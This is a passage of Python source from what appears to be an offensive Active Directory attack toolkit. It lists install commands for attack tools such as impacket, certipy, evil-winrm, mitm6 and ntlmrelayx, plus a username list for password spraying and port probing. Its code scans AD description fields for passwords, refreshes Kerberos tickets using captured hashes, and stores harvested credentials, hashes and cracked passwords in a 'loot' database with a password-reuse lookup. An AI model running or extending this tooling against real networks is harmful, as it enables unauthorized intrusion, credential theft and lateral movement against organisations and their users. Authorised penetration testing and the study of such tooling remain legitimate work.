                full = os.path.join(expanded, n)
                if os.path.exists(full): return full
    return None


TOOL_INSTALL = {
    'netexec':              'pip install netexec --break-system-packages',
    'nxc':                  'pip install netexec --break-system-packages',
    'crackmapexec':         'pip install crackmapexec --break-system-packages',
    'certipy':              'pip install certipy-ad --break-system-packages',
    'certipy-ad':           'pip install certipy-ad --break-system-packages',
    'bloodyad':             'pip install bloodyAD --break-system-packages',
    'impacket-secretsdump': 'pip install impacket --break-system-packages',
    'impacket-getTGT':      'pip install impacket --break-system-packages',
    'impacket-getST':       'pip install impacket --break-system-packages',
    'impacket-GetUserSPNs': 'pip install impacket --break-system-packages',
    'impacket-GetNPUsers':  'pip install impacket --break-system-packages',
    'impacket-wmiexec':     'pip install impacket --break-system-packages',
    'impacket-smbclient':   'pip install impacket --break-system-packages',
    'impacket-dacledit':    'pip install impacket --break-system-packages',
    'dacledit.py':          'pip install impacket --break-system-packages',
    'impacket-owneredit':   'pip install impacket --break-system-packages',
    'impacket-addcomputer': 'pip install impacket --break-system-packages',
    'evil-winrm':           'gem install evil-winrm',
    'kerbrute':             'go install github.com/ropnop/kerbrute@latest  OR  apt install kerbrute',
    'rusthound-ce':         'cargo install rusthound-ce  OR  download from github',
    'bloodhound-python':    'pip install bloodhound --break-system-packages',
    'ldeep':                'pip install ldeep --break-system-packages',
    'john':                 'sudo apt install john',
    'hashcat':              'sudo apt install hashcat',
    'faketime':             'sudo apt install faketime',
    'ntpdate':              'sudo apt install ntpdate',
    'smbclient':            'sudo apt install smbclient',
    'pywhisker':            'git clone https://github.com/ShutdownRepo/pywhisker ~/.segfault-ad/tools/pywhisker',
    'username-anarchy':     'git clone https://github.com/urbanadventurer/username-anarchy ~/.segfault-ad/tools/username-anarchy',
    'gettgtpkinit':         'git clone https://github.com/dirkjanm/PKINITtools ~/.segfault-ad/tools/PKINITtools',
    'getnthash':            'git clone https://github.com/dirkjanm/PKINITtools ~/.segfault-ad/tools/PKINITtools',
    'mitm6':                'pip install mitm6 --break-system-packages',
    'ntlmrelayx':           'pip install impacket --break-system-packages',
    'adidnsdump':           'pip install adidnsdump --break-system-packages',
    'pypsrp':               'pip install pypsrp --break-system-packages',
    'timeroast':            'git clone https://github.com/SecuraBV/Timeroast  # or: nxc -M timeroast (built-in)',
    'ligolo-proxy':         'wget https://github.com/nicocha30/ligolo-ng/releases/latest  # download proxy + agent',
    'ffuf':                 'sudo apt install ffuf -y  # or: go install github.com/ffuf/ffuf/v2@latest',
    'nmap':                 'sudo apt install nmap -y',
    'pywerview':            'pip install "pywerview[kerberos]" --break-system-packages',
    'AADInternals':         'git clone https://github.com/Gerenios/AADInternals ~/.segfault-ad/tools/AADInternals',
    'adconnectdump':        'git clone https://github.com/fox-it/adconnectdump ~/.segfault-ad/tools/adconnectdump',
    'gmsadumper':           'git clone https://github.com/micahvandeusen/gMSADumper ~/.segfault-ad/tools/gMSADumper',
    'ldap3':                'pip install ldap3 --break-system-packages',
    'krbrelayx':            'git clone https://github.com/dirkjanm/krbrelayx ~/.segfault-ad/tools/krbrelayx',
    'targetedKerberoast':   'git clone https://github.com/ShutdownRepo/targetedKerberoast ~/.segfault-ad/tools/targetedKerberoast',
    'pre2k':                'git clone https://github.com/garrettfoster13/pre2k ~/.segfault-ad/tools/pre2k',
}


def _progress_proc(proc, label, grep_pattern=None):
    """Stream process output with a live progress indicator."""
    import re as _re_pg, threading as _th, time as _ti
    spinner = ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏']
    spin_i = [0]
    done = [False]
    lines_out = []

    def _spin():
        while not done[0]:
            sp = spinner[spin_i[0] % len(spinner)]
            print(f'\r  {C0}{sp}{RESET} {GREY}{label}...{RESET}   ', end='', flush=True)
            spin_i[0] += 1
            _ti.sleep(0.1)
        print(f'\r  {GREEN}✓{RESET} {label}   ', flush=True)

    t = _th.Thread(target=_spin, daemon=True); t.start()
    try:
        for line in proc.stdout:
            lines_out.append(line.rstrip())
            # show important lines immediately (hits, hashes, errors)
            if grep_pattern and re.search(grep_pattern, line, re.I):
                print(f'\n  {GREEN}{line.rstrip()}{RESET}')
    finally:
        done[0] = True; t.join()
    proc.wait()
    # auto-save usernames from output
    try:
        if TARGET.loot_dir and lines_out:
            _u = _parse_usernames(lines_out, TARGET.domain or '')
            if _u: _save_users(_u, TARGET.loot_dir, TARGET.domain or '')
    except Exception: pass
    return lines_out, proc.returncode


# Common AD username candidates — ordered by likelihood, used in spray/userenum
AD_BIASED_USERS = [
    # Built-in AD accounts
    "administrator","guest","krbtgt","defaultaccount","wdagutilityaccount",
    # Admin patterns
    "admin","adm","sysadmin","domainadmin","superuser",
    # Service accounts
    "svc","service","svc_sql","svc_exchange","svc_backup","svc_iis",
    "svc_smtp","svc_print","svc_scan","svc_monitoring","svc_ldap",
    "svc_sso","svc_vmware","svc_sccm","svc_jenkins","svc_sharepoint",
    "svc_adsync","svc_aad","svc_veeam","svc_ad","svc_loanmgr",
    # IT roles
    "helpdesk","support","it","itadmin","netadmin","security","soc",
    "infosec","audit","operator","ops","monitor","backup","backupadmin",
    # Dev/build/test
    "developer","dev","devops","deploy","build","jenkins","test","qa",
    # DB/app
    "sa","sql","mssql","dba","sqladmin","oracle","postgres",
    # Apps
    "exchange","sccm","vmware","vcenter","sharepoint","veeam",
    # Generic
    "user","user1","user01","default","public","guest1",
    # Common first names
    "john","jane","michael","sarah","david","emily","james","emma",
    "robert","olivia","william","sophia","richard","jessica","thomas",
    "ashley","charles","amanda","christopher","melissa","daniel","stephanie",
    "matthew","jennifer","anthony","elizabeth","mark","linda","donald","barbara",
]

def probe_ports(host, ports, timeout=2):
    """Quick TCP port probe — returns set of open ports."""
    import socket as _sock
    open_ports = set()
    def _try(p):
        try:
            s = _sock.create_connection((host, p), timeout=timeout)
            s.close(); open_ports.add(p)
        except Exception: pass
    with ThreadPoolExecutor(max_workers=len(ports)) as pool:
        pool.map(_try, ports)
    return open_ports

def best_protocol(host, prefer=None):
    """Probe common AD ports and return best nxc protocol to use."""
    proto_ports = {
        'smb':   [445, 139],
        'ldap':  [389, 636],
        'winrm': [5985, 5986],
        'mssql': [1433],
        'ssh':   [22],
        'rdp':   [3389],
    }
    all_ports = [p for ps in proto_ports.values() for p in ps]
    open_p = probe_ports(host, all_ports, timeout=1)
    available = [proto for proto, ports in proto_ports.items()
                 if any(p in open_p for p in ports)]
    if prefer and prefer in available: return prefer, available
    # priority order
    for proto in ['smb','ldap','winrm','mssql','rdp','ssh']:
        if proto in available: return proto, available
    return None, available

def check_tool_verbose(*names):
    """Like check_tool but logs install hint when not found."""
    result = check_tool(*names)
    if not result:
        for n in names:
            hint = TOOL_INSTALL.get(n)
            if hint:
                log(f'{WHITE}{n}{RESET} not found — install: {GREY}{hint}{RESET}','warn')
                break
        else:
            log(f'{WHITE}{" / ".join(names)}{RESET} not found','error')
    return result

def input_field(label, default=None, options=None):
    # --yes mode: auto-return default for confirmations, skip destructive prompts
    if _YES_MODE:
        val = default or ''
        # for y/n prompts default to 'y' to auto-confirm
        if options and set(options) == {'y','n'} and not default:
            val = 'y'
        log(f'{GREY}[--yes] {label} = {val}{RESET}','info')
        return val
    cur = f'{GREY}[{default}]{RESET} ' if default else ''
    if options:
        def _c(text, state):
            m = [o for o in options if o.startswith(text)]
            return m[state] if state < len(m) else None
        readline.set_completer(_c)
        readline.parse_and_bind('tab: complete')
    try:
        val = input(f'  {C0}{label}{RESET} {cur}> ').strip()
    except (EOFError, KeyboardInterrupt):
        val = ''
    finally:
        readline.set_completer(ad_completer)
        readline.parse_and_bind('tab: complete')
    return val or default or ''

def _scan_descriptions(lines, loot_dir, domain):
    """Scan AD user description fields for passwords and save hits."""
    import re as _re_desc
    hits = []
    pw_patterns = [
        r'(?:password|passwd|pwd|pass)\s*[:=]\s*(\S+)',
        r'(?:temporary|temp|initial|default)\s+(?:password|pwd)\s*[:=]?\s*(\S+)',
        r'([A-Za-z0-9!@#$%^&*()_+\-=]{8,})',  # generic potential passwords
    ]
    for line in lines:
        if 'Description' not in line and 'description' not in line: continue
        for pat in pw_patterns:
            m = _re_desc.search(pat, line, _re_desc.I)
            if m:
                pw = m.group(1).strip()
                if len(pw) >= 6 and pw not in ('N/A','None','null','password','Password'):
                    hits.append((line.strip(), pw))
                    break
    if hits:
        out = os.path.join(loot_dir, 'desc_passwords.txt')
        with open(out, 'a') as f:
            for line, pw in hits:
                f.write(f'{line}\n')
        log(f'{PINK}🔑 {len(hits)} password(s) found in description fields → {WHITE}{out}{RESET}','success')
        for line, pw in hits[:5]:
            print(f'  {PINK}→{RESET} {line}')


def faketime_wrap(cmd, skew):
    """Wrap a command with faketime if skew is set and faketime is available."""
    if skew and check_tool('faketime'):
        return ['faketime', skew] + [str(c) for c in cmd]
    return [str(c) for c in cmd]

_TRACEBACK_PATTERNS = (
    'Traceback (most recent call last)',
    '  File "', 'File "/', '~~~~^^', '  ^^^',
    'sys.exit(', 'asyncio.run(', 'runners.py',
    'base_events.py', 'return runner.run',
    'return self._loop', 'return future.result',
    'output = await', 'raise e', 'raise err',
    'await ldap.', 'await conn.',
)
_ERROR_SUMMARY_PATTERNS = (
    'LDAPModifyException', 'LDAPException', 'KerberosException',
    'SessionError', 'KDC_ERR', 'STATUS_', 'NT_STATUS',
    'Error:', 'error:', 'Exception:', 'FAILED',
    'badldap.commons', 'impacket.',
)

def _filter_line(l):
    """Return True if line should be shown, False if it's a traceback noise line."""
    stripped = l.strip()
    if not stripped: return False
    # suppress traceback boilerplate
    if any(p in l for p in _TRACEBACK_PATTERNS): return False
    # suppress bare module path lines like 'bloodyAD/main.py'
    if stripped.endswith('.py') and '/' in stripped: return False
    return True

def _is_error_summary(l):
    """True if this is the meaningful error line we DO want to show."""
    return any(p in l for p in _ERROR_SUMMARY_PATTERNS)

def _refresh_tgt_if_needed(output_lines):
    """Auto-refresh TGT if ticket expired error detected."""
    expired_signals = ['KRB_AP_ERR_TKT_EXPIRED','TKT_EXPIRED','Ticket expired',
                       'Credentials have expired','KDC_ERR_TKT_EXPIRED']
    # don't trigger on MSSQL/SQL login failures
    skip_signals = ['Login failed for user','Login failed. The login is from an untrusted',
                    'ERROR(', 'mssqlclient', 'impacket-mssql']
    joined = '\n'.join(output_lines)
    if any(sig in joined for sig in skip_signals):
        return False
    if not any(sig in joined for sig in expired_signals):
        return False
    ccache = os.environ.get('KRB5CCNAME','')
    if not ccache or not os.path.exists(ccache): return False
    log(f'{ORANGE}TGT expired — auto-refreshing...{RESET}','warn')
    getTGT = check_tool('impacket-getTGT','getTGT.py')
    if not getTGT: return False
    if TARGET.password:
        r = subprocess.run([getTGT,f'{TARGET.domain}/{TARGET.user}:{TARGET.password}',
                           '-dc-ip',TARGET.dc], capture_output=True, text=True)
    elif TARGET.hash:
        r = subprocess.run([getTGT,f'{TARGET.domain}/{TARGET.user}',
                           '-hashes',f':{TARGET.hash}','-dc-ip',TARGET.dc],
                          capture_output=True, text=True)
    else:
        return False
    if 'Saving ticket' in (r.stdout+r.stderr):
        fname = f'{TARGET.user}.ccache'
        if os.path.exists(fname):
            dest = os.path.join(TARGET.loot_dir, fname)
            shutil.move(fname, dest)
            os.environ['KRB5CCNAME'] = dest
        log(f'{GREEN}TGT refreshed automatically{RESET}','success')
        return True
    return False


_CMD_TIMEOUT = 300  # default subprocess timeout in seconds

_SENSITIVE_PATTERNS = [
    (r'(-p\s+|--password\s+|:)\S+', lambda m: m.group(0).split(':')[0]+':***' if ':' in m.group(0) else m.group(0).split()[0]+' ***'),
    (r'(-H\s+|--hash\s+)[0-9a-fA-F:]{16,}', lambda m: m.group(0)[:4]+'***'),
]

def _mask_sensitive(cmd_str):
    """Mask passwords and hashes in command strings before logging."""
    import re as _re_mask
    result = cmd_str
    for pat, repl in _SENSITIVE_PATTERNS:
        try: result = _re_mask.sub(pat, repl, result)
        except Exception: pass
    return result

def run_cmd(cmd, label=None, env=None, _retry_on_expired=True, timeout=None):
    _timeout = timeout or _CMD_TIMEOUT
    cmd_str  = ' '.join(str(c) for c in cmd)
    masked   = _mask_sensitive(cmd_str)
    if label:
        log(f'{WHITE}{label}{RESET}', 'info')
        log(f'{GREY}{masked}{RESET}', 'info')
        _logfile(f'RUN [{label}]: {masked}')
        hr()
    try:
        proc = subprocess.Popen([str(c) for c in cmd],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, errors='replace', env=env)
        _register_proc(proc)
        pending_errors = []
        output_lines   = []
        for line in proc.stdout:
            l = line.rstrip()
            output_lines.append(l)
            if not _filter_line(l):
                if _is_error_summary(l):
                    pending_errors.append(l.strip())
                continue
            for el in pending_errors:
                print(f'  {RED}{el}{RESET}')
            pending_errors = []
            if any(x in l for x in ['[+]','Pwn3d!','SUCCESS','FOUND','successfully','added to','removed from']):
                print(f'  {GREEN}{l}{RESET}')
            elif any(x in l for x in ['[-]','ERROR','Error','failed','error']):
                print(f'  {RED}{l}{RESET}')
            elif any(x in l for x in ['[*]','[i]','INFO','Trying']):
                print(f'  {GREY}{l}{RESET}')
            elif '$krb5' in l or ':::' in l:
                print(f'  {PINK}{l}{RESET}')
            elif any(x in l for x in ['VULNERABLE','ESC','[VULNERABLE]']):
                print(f'  {ORANGE}{l}{RESET}')
            else:
                print(f'  {WHITE}{l}{RESET}')
        for el in pending_errors:
            friendly = _translate_error(el)
            if friendly: print(f'  {friendly}')
            else:        print(f'  {RED}{el}{RESET}')
        proc.wait()
        if _retry_on_expired and _refresh_tgt_if_needed(output_lines):
            log(f'{C0}Retrying with fresh TGT...{RESET}','info')
            return run_cmd(cmd, label=None, env=env, _retry_on_expired=False)
        return proc.returncode
    except FileNotFoundError:
        log(f'{cmd[0]} not found in PATH', 'error'); return 1
    except Exception as exc:
        log(f'Error: {exc}', 'error'); return 1
def run_cmd_capture(cmd, label=None, env=None, timeout=None):
    _timeout = timeout or _CMD_TIMEOUT
    masked = _mask_sensitive(' '.join(str(c) for c in cmd))
    """Like run_cmd but also returns list of output lines for parsing."""
    lines_out = []
    if label:
        log(f'{WHITE}{label}{RESET}', 'info')
        log(f'{GREY}{masked}{RESET}', 'info')
        hr()
    try:
        proc = subprocess.Popen([str(c) for c in cmd],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, errors='replace', env=env)
        _register_proc(proc)
        pending_errors = []
        for line in proc.stdout:
            l = line.rstrip()
            lines_out.append(l)
            if not _filter_line(l):
                if _is_error_summary(l):
                    pending_errors.append(l.strip())
                continue
            for el in pending_errors:
                print(f'  {RED}{el}{RESET}')
            pending_errors = []
            if any(x in l for x in ['[+]','Pwn3d!','SUCCESS','FOUND','successfully','added to','removed from']):
                print(f'  {GREEN}{l}{RESET}')
            elif any(x in l for x in ['[-]','ERROR','Error','failed','error']):
                print(f'  {RED}{l}{RESET}')
            elif any(x in l for x in ['[*]','[i]','INFO','Trying']):
                print(f'  {GREY}{l}{RESET}')
            elif '$krb5' in l or ':::' in l:
                print(f'  {PINK}{l}{RESET}')
            elif any(x in l for x in ['VULNERABLE','ESC','[VULNERABLE]']):
                print(f'  {ORANGE}{l}{RESET}')
            else:
                print(f'  {WHITE}{l}{RESET}')
        for el in pending_errors:
            friendly = _translate_error(el)
            if friendly:
                print(f'  {friendly}')
            else:
                print(f'  {RED}{el}{RESET}')
        _unregister_proc(proc)
        proc.wait()
        # auto-save any usernames found in output
        try:
            if TARGET.loot_dir and lines_out:
                _users = _parse_usernames(lines_out, TARGET.domain or '')
                if _users: _save_users(_users, TARGET.loot_dir, TARGET.domain or '')
        except Exception: pass
        _unregister_proc(proc)
        return proc.returncode, lines_out
    except FileNotFoundError:
        log(f'{cmd[0]} not found in PATH', 'error'); return 1, []
    except Exception as exc:
        log(f'Error: {exc}', 'error'); return 1, []

_ERROR_FRIENDLY = {
    'KDC_ERR_ETYPE_NOSUPP':      'Kerberos enc type not supported — user may be in Protected Users (RC4 disabled)',
    'KDC_ERR_PREAUTH_FAILED':    'Wrong password or account locked',
    'KDC_ERR_C_PRINCIPAL_UNKNOWN': 'User not found in domain',
    'KRB_AP_ERR_SKEW':           'Clock skew too large — run clockskew sync',
    'STATUS_NOT_SUPPORTED':      'NTLM disabled — run tgt first for Kerberos auth',
    'STATUS_LOGON_FAILURE':      'Wrong credentials',
    'STATUS_ACCOUNT_LOCKED_OUT': 'Account locked out',
    'STATUS_PASSWORD_EXPIRED':   'Password expired',
    'invalidCredentials':        'Wrong credentials or account restrictions',
    'insufficientAccessRights':  'Access denied — insufficient privileges',
    'No route to host':          'Cannot reach DC — check IP and /etc/hosts',
    'Connection refused':        'Port closed on DC',
    'Name or service not known': 'DNS resolution failed — check /etc/hosts',
    'Errno 113':                 'No route to host — DC unreachable',
    'Password can\'t be changed': 'Password change rejected — try: tgt → bloody resetpwd',
}

def _translate_error(line):
    for key, msg in _ERROR_FRIENDLY.items():
        if key in line:
            return f'{RED}{msg}{RESET}  {GREY}({key}){RESET}'
    return None

def clean_output(text):
    """Filter Python traceback noise from subprocess output, return clean lines."""
    out = []
    for l in text.splitlines():
        if not _filter_line(l):
            if _is_error_summary(l):
                out.append(l.strip())
        else:
            out.append(l)
    return '\n'.join(out)

def print_clean(text, success_hint=None):
    """Print subprocess output with traceback filtering and color coding."""
    for l in clean_output(text).splitlines():
        if not l.strip(): continue
        if any(x in l for x in ['[+]','successfully','added to','removed from','Saved','saved','cracked']):
            print(f'  {GREEN}{l}{RESET}')
        elif any(x in l for x in ['[-]','Error','error','failed','Exception','can\'t','STATUS_','KDC_ERR']):
            print(f'  {RED}{l}{RESET}')
        elif any(x in l for x in ['[*]','[i]','Saving','Trying']):
            print(f'  {GREY}{l}{RESET}')
        elif '$krb5' in l or ':::' in l:
            print(f'  {PINK}{l}{RESET}')
        else:
            print(f'  {WHITE}{l}{RESET}')


def _parse_usernames(lines, domain=''):
    """Extract usernames from netexec/rid-brute/ldap output lines."""
    import re
    users = set()
    for l in lines:
        # netexec --users: '  SMB  ...  -Username-  ...' header skip
        # netexec --users: '  SMB  ...  username  2024-...'
        # rid-brute: '500: DOMAIN\Administrator (SidTypeUser)'
        m = re.search(r'(\d+):\s+\S+\\(\S+)\s+\(SidTypeUser\)', l)
        if m:
            u = m.group(2)
            if u.upper() not in ('ADMINISTRATOR','GUEST','KRBTGT','DC$'):
                users.add(u); continue
        # --users output: lines with username then last pw set date
        m = re.search(r'([A-Za-z0-9._-]{2,64})\s+\d{4}-\d{2}-\d{2}', l)
        if m:
            u = m.group(1)
            if '.' not in u and u.upper() not in ('-USERNAME-','ADMINISTRATOR','GUEST','KRBTGT'):
                users.add(u)
    return sorted(users)

def _save_users(users, loot_dir, domain=''):
    """Save usernames to loot/users.txt and loot/users_fqdn.txt."""
    if not users: return
    os.makedirs(loot_dir, exist_ok=True)
    ufile = os.path.join(loot_dir, 'users.txt')
    ffile = os.path.join(loot_dir, 'users_fqdn.txt')
    existing = set(open(ufile, errors='replace').read().splitlines()) if os.path.exists(ufile) else set()
    new_users = set(users) - existing
    if new_users:
        with open(ufile, 'a') as f:
            for u in sorted(new_users): f.write(u + '\n')
        if domain:
            with open(ffile, 'a') as f:
                for u in sorted(new_users): f.write(f'{u}@{domain}\n')
        log(f'{GREEN}+{len(new_users)} new users → {WHITE}{ufile}{RESET}', 'success')

# =============================================================================
# TARGET
# =============================================================================
class Target:
    def __init__(self):
        self.domain=None; self.dc=None; self.dc_fqdn=None; self.user=None
        self.password=None; self.hash=None
        self.skew=None           # clock skew offset e.g. "+2h30m" detected from DC
        self.loot_dir = os.path.expanduser('~/.segfault-ad/loot')
        self.workspace_set = False   # True only when user explicitly sets a workspace
        os.makedirs(self.loot_dir, exist_ok=True)

    def nxc_args(self, host=None):
        h = host or self.dc_fqdn or self.dc or ''
        base = [h]
        ccache = os.environ.get('KRB5CCNAME','')
        if ccache and os.path.exists(ccache):
            # Kerberos — use FQDN and kcache
            if h == self.dc and self.dc_fqdn:
                base = [self.dc_fqdn]
            base += ['-k','--use-kcache']
            if self.user: base += ['-u', self.user]
        else:
            if self.user:       base += ['-u', self.user]
            if self.hash:       base += ['-H', self.hash]
            elif self.password: base += ['-p', self.password]
            if self.domain:     base += ['-d', self.domain]
        return base

    def bloodyad_args(self, ldaps=False, force_krb=False):
        ccache = os.environ.get('KRB5CCNAME','')
        has_ccache = bool(ccache and os.path.exists(ccache))
        # prefer password/hash auth — more reliable; only use Kerberos if no creds
        use_krb = force_krb or (has_ccache and not self.password and not self.hash)
        if use_krb:
            host = self.dc_fqdn or f'FOREST.{self.domain}'  # needs FQDN for Kerberos
        else:
            host = self.dc_fqdn or self.dc
        args = ['--host', host, '--dc-ip', self.dc, '-d', self.domain, '-u', self.user]
        if ldaps: args += ['-s']
        if use_krb:
            args += ['-k']
        elif self.hash:     args += ['-p', f':{self.hash}']
        elif self.password: args += ['-p', self.password]
        return args

    def imp_str(self, host=None):
        h    = host or self.dc or ''
        user = self.user or ''
        if self.password: return [f'{self.domain}/{user}:{self.password}@{h}'], []
        elif self.hash:   return [f'{self.domain}/{user}@{h}'], ['-hashes', f':{self.hash}']
        return [f'{self.domain}/{user}@{h}'], ['-no-pass']

    def is_set(self): return bool(self.domain and self.dc)

    def summary(self):
        p = []
        if self.domain:   p.append(f'{C0}domain{RESET}:{WHITE}{self.domain}{RESET}')
        if self.dc:       p.append(f'{C0}dc{RESET}:{WHITE}{self.dc}{RESET}')
        if self.dc_fqdn:  p.append(f'{C0}fqdn{RESET}:{WHITE}{self.dc_fqdn}{RESET}')
        if self.user:     p.append(f'{C0}user{RESET}:{WHITE}{self.user}{RESET}')
        if self.password: p.append(f'{C0}pass{RESET}:{GREEN}set{RESET}')
        if self.hash:     p.append(f'{C0}hash{RESET}:{PINK}set{RESET}')
        return '  '.join(p) if p else f'{GREY}no target -- use: set{RESET}'

TARGET = Target()

# ── session results ───────────────────────────────────────────────────────────
# Each entry: {'module': str, 'status': 'ok'|'warn', 'detail': str}

# =============================================================================
# SQLITE DATABASE — persistent credential and finding storage across sessions
# =============================================================================
_DB_PATH = os.path.expanduser('~/.segfault-ad/segfault.db')

def _db_connect():
    os.makedirs(os.path.dirname(_DB_PATH), exist_ok=True)
    conn = sqlite3.connect(_DB_PATH, timeout=10)
    conn.row_factory = sqlite3.Row
    conn.execute('PRAGMA journal_mode=WAL')   # faster concurrent writes
    conn.execute('PRAGMA synchronous=NORMAL') # safe + fast
    conn.execute('PRAGMA cache_size=-8000')   # 8MB cache
    return conn

def _db_init():
    with _db_connect() as conn:
        conn.executescript('''
            CREATE TABLE IF NOT EXISTS credentials (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                workspace   TEXT NOT NULL,
                domain      TEXT,
                username    TEXT NOT NULL,
                password    TEXT,
                hash        TEXT,
                source      TEXT,
                valid       INTEGER DEFAULT 1,
                created_at  TEXT DEFAULT (datetime('now')),
                updated_at  TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS findings (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                workspace   TEXT NOT NULL,
                domain      TEXT,
                module      TEXT NOT NULL,
                detail      TEXT,
                status      TEXT DEFAULT 'ok',
                created_at  TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS hashes (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                workspace   TEXT NOT NULL,
                domain      TEXT,
                username    TEXT,
                hash_type   TEXT,
                hash_value  TEXT NOT NULL,
                cracked     INTEGER DEFAULT 0,
                password    TEXT,
                created_at  TEXT DEFAULT (datetime('now')),
                UNIQUE(workspace, hash_value)
            );
            CREATE INDEX IF NOT EXISTS idx_creds_workspace  ON credentials(workspace);
            CREATE INDEX IF NOT EXISTS idx_creds_username   ON credentials(username);
            CREATE INDEX IF NOT EXISTS idx_creds_password   ON credentials(password);
            CREATE INDEX IF NOT EXISTS idx_findings_workspace ON findings(workspace);
            CREATE INDEX IF NOT EXISTS idx_hashes_workspace ON hashes(workspace);
        ''')

def _db_save_cred(workspace, domain, username, password=None, hash_val=None, source='manual'):
    """Save or update a credential in the database."""
    if not username: return
    try:
        with _db_connect() as conn:
            # check if exists
            existing = conn.execute(
                'SELECT id FROM credentials WHERE workspace=? AND username=? AND domain=?',
                (workspace, username, domain or '')).fetchone()
            if existing:
                conn.execute('''UPDATE credentials SET password=?, hash=?, source=?,
                                valid=1, updated_at=datetime('now') WHERE id=?''',
                             (password, hash_val, source, existing['id']))
            else:
                conn.execute('''INSERT INTO credentials (workspace,domain,username,password,hash,source)
                                VALUES (?,?,?,?,?,?)''',
                             (workspace, domain or '', username, password, hash_val, source))
    except Exception as e:
        pass  # never crash the tool over DB

def _db_save_hash(workspace, domain, username, hash_type, hash_value):
    """Save a hash to the database."""
    try:
        with _db_connect() as conn:
            conn.execute('''INSERT OR IGNORE INTO hashes (workspace,domain,username,hash_type,hash_value)
                            VALUES (?,?,?,?,?)''',
                         (workspace, domain or '', username or '', hash_type, hash_value))
    except Exception:
        pass

def _db_mark_cracked(hash_value, password):
    """Mark a hash as cracked and link the password."""
    try:
        with _db_connect() as conn:
            conn.execute('''UPDATE hashes SET cracked=1, password=? WHERE hash_value=?''',
                         (password, hash_value))
    except Exception:
        pass

def _db_save_finding(workspace, domain, module, detail, status='ok'):
    """Save a module finding to the database."""
    try:
        with _db_connect() as conn:
            conn.execute('''INSERT INTO findings (workspace,domain,module,detail,status)
                            VALUES (?,?,?,?,?)''',
                         (workspace, domain or '', module, detail, status))
    except Exception:
        pass

def _db_search(query, workspace=None):
    """Search credentials, hashes and findings."""
    results = {'credentials': [], 'hashes': [], 'findings': []}
    try:
        with _db_connect() as conn:
            q = f'%{query}%'
            ws_filter = 'AND workspace=?' if workspace else ''
            ws_args   = (workspace,) if workspace else ()

            results['credentials'] = conn.execute(
                f'''SELECT * FROM credentials WHERE (username LIKE ? OR password LIKE ?
                    OR hash LIKE ? OR domain LIKE ?) {ws_filter}
                    ORDER BY updated_at DESC LIMIT 50''',
                (q,q,q,q)+ws_args).fetchall()

            results['hashes'] = conn.execute(
                f'''SELECT * FROM hashes WHERE (username LIKE ? OR hash_value LIKE ?
                    OR password LIKE ?) {ws_filter}
                    ORDER BY created_at DESC LIMIT 50''',
                (q,q,q)+ws_args).fetchall()

            results['findings'] = conn.execute(
                f'''SELECT * FROM findings WHERE (module LIKE ? OR detail LIKE ?) {ws_filter}
                    ORDER BY created_at DESC LIMIT 50''',
                (q,q)+ws_args).fetchall()
    except Exception:
        pass
    return results

def _db_get_workspace_summary(workspace):
    """Get credential/hash/finding counts for a workspace."""
    try:
        with _db_connect() as conn:
            creds   = conn.execute('SELECT COUNT(*) FROM credentials WHERE workspace=?',(workspace,)).fetchone()[0]
            hashes  = conn.execute('SELECT COUNT(*) FROM hashes WHERE workspace=?',(workspace,)).fetchone()[0]
            cracked = conn.execute('SELECT COUNT(*) FROM hashes WHERE workspace=? AND cracked=1',(workspace,)).fetchone()[0]
            findings= conn.execute('SELECT COUNT(*) FROM findings WHERE workspace=?',(workspace,)).fetchone()[0]
            return {'creds':creds,'hashes':hashes,'cracked':cracked,'findings':findings}
    except Exception:
        return {}

def _db_password_reuse(password):
    """Find all users who have used this password across all workspaces."""
    try:
        with _db_connect() as conn:
            return conn.execute(
                'SELECT workspace,domain,username,source FROM credentials WHERE password=? ORDER BY workspace',
                (password,)).fetchall()
    except Exception:
        return []

# initialise DB on startup
try:
    _db_init()
except Exception:
    pass

_SESSION_RESULTS  = []
_RESULTS_MAX      = 5
_MODULE_RUN_CACHE = {}   # cache_key → {'result':str,'time':str}
_YES_MODE         = False  # --yes flag: auto-confirm all prompts
_QUIET_MODE       = False  # --quiet flag: skip banner animation

# modules that should append rather than replace (each entry is meaningful)
_MULTI_RESULT_MODULES = {'spray','shares','hashcrack','bloody','nxcmodules','enum','backupabuse','zipslip','certipy'}

def _session_state_path():
    """Path to session state file for current workspace."""
    if TARGET and TARGET.loot_dir:
        ws_dir = os.path.dirname(TARGET.loot_dir)  # loot_dir is workspace/loot/
        return os.path.join(ws_dir, 'session_state.json')
    return None

def _save_session_state():
    """Persist _SESSION_RESULTS to workspace file."""
    path = _session_state_path()
    if not path: return
    try:
        import json as _json_ss
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w') as f:
            _json_ss.dump(_SESSION_RESULTS, f)
    except Exception:
        pass

def _load_session_state():
    """Restore _SESSION_RESULTS from workspace file."""
    global _SESSION_RESULTS
    path = _session_state_path()
    if not path or not os.path.exists(path): return
    try:
        import json as _json_ls
        saved = _json_ls.loads(open(path).read())
        if isinstance(saved, list) and saved:
            _SESSION_RESULTS = saved
            log(f'{GREEN}Session restored — {WHITE}{len(saved)}{RESET}{GREEN} chain steps loaded{RESET}','success')
    except Exception:
        pass
    # clear module run cache when switching workspaces
    _MODULE_RUN_CACHE.clear()

def add_result(module, detail, status='ok'):
    """Record a one-line finding. Multi-result modules append; others replace."""
    global _SESSION_RESULTS
    if module not in _MULTI_RESULT_MODULES:
        _SESSION_RESULTS = [r for r in _SESSION_RESULTS if r['module'] != module]
    _SESSION_RESULTS.append({'module': module, 'status': status, 'detail': detail})
    # persist to disk and DB
    _save_session_state()
    ws = os.path.basename(TARGET.loot_dir) if TARGET.loot_dir else 'default'
    _db_save_finding(ws, TARGET.domain, module, detail, status)

# ── cleanup tracker ───────────────────────────────────────────────────────────
# Each entry: {'type': str, 'desc': str, 'undo': callable}
# Types: 'dacl', 'owner', 'group_member', 'user_created', 'password_reset', 'upn'
_CLEANUP_STACK = []

def track_cleanup(action_type, desc, undo_fn):
    """Push a reversible action onto the cleanup stack."""
    _CLEANUP_STACK.append({'type': action_type, 'desc': desc, 'undo': undo_fn})

def _set_ccache(ccache_path):
